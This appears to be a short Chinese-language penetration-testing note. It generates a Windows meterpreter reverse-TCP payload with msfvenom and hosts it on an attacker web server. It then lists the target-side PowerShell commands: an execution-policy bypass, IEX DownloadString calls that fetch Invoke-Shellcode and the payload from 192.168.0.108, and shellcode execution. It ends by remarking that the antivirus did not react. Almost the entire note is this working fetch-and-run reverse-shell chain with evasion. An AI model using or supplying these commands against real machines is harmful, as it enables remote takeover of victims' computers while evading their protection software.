	生成code
	>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f powershell -o /var/www/html/1.ps1
	目标执行
	> powershell -ep bypass
	> IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.108/ps/powersploit/CodeExecution/Invoke-Shellcode.ps1')
	> IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.108/1.ps1')
	> Invoke-Shellcode -Shellcode ($buf) -Force

![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/82.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/83.png)

	防护软件没反应